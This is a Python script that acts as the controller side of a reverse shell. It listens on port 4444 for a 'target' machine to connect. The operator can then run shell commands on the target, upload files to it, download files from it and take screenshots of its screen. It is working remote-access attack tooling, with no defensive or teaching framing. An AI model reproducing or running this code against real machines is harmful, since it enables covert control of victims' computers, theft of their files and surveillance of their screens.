import socket  # To create a new connection
from termcolor import colored  # To add colors to terminal output
import json
import os

def data_send(data):
    """Send data to the target."""
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def get_current_ip():
    """Retrieve the current IP address of the machine (not localhost)."""
    try:
        # Create a temporary socket to determine the external IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  # Connect to Google DNS (or any accessible IP)
            ip = s.getsockname()[0]
        return ip
    except Exception as e:
        print(colored(f"[!] Unable to retrieve the current IP: {e}", 'red'))

def data_recv():
    """Receive data from the target."""
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file):
    """Upload a file to the target."""
    try:
        with open(file, 'rb') as f:
            target.send(f.read())
    except FileNotFoundError:
        print(colored(f"[!] File '{file}' not found.", 'red'))

def download_file(file):
    """Download a file from the target."""
    try:
        with open(file, 'wb') as f:
            target.settimeout(5)
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
    except socket.timeout:
        print(colored("[!] Timeout while receiving the file.", 'red'))
    finally:
        target.settimeout(None)

def t_commun():
    """Handle communication with the target."""
    count = 0
    while True:
        try:
            comm = input(f'* Shell~{ip}: ')
            data_send(comm)

            if comm == 'exit':
                break
            elif comm == 'clear':
                os.system('clear' if os.name != 'nt' else 'cls')
            elif comm.startswith('cd '):
                pass  # Command handled on the client-side
            elif comm.startswith('upload '):
                upload_file(comm[7:])
            elif comm.startswith('download '):
                download_file(comm[9:])
            elif comm.startswith('screenshot'):
                screenshot_file = f'screenshot{count}.png'
                with open(screenshot_file, 'wb') as f:
                    target.settimeout(5)
                    while True:
                        chunk = target.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                target.settimeout(None)
                count += 1
                print(colored(f"[+] Screenshot saved as {screenshot_file}", 'green'))
            elif comm == 'help':
                print(colored(
                    '''\n
                    exit: Close the session with the target machine.
                    cd: Change directory on the target machine. Use: cd <directory-name>.
                    upload: Upload a file to the target machine. Use: upload <file-path>.
                    download: Download a file from the target machine. Use: download <file-path>.
                    screenshot: Capture a screenshot from the target machine.
                    clear: Clear the terminal screen.
                    help: Display available commands.
                    ''', 'green'))
            else:
                answer = data_recv()
                print(answer)

        except Exception as e:
            print(colored(f"[!] Error: {e}", 'red'))

# Configure the server socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    current_ip = get_current_ip()
    if current_ip is None:
        raise Exception("Could not determine the IP address.")

    sock.bind((current_ip, 4444))
    print(colored(f'[-] Awaiting connections on {current_ip}', 'yellow'))
    sock.listen(5)

    target, ip = sock.accept()
    print(colored(f'[+] Connected to: {ip}', 'green'))
    t_commun()
except Exception as e:
    print(colored(f"[!] Server initialization error: {e}", 'red'))
finally:
    sock.close()

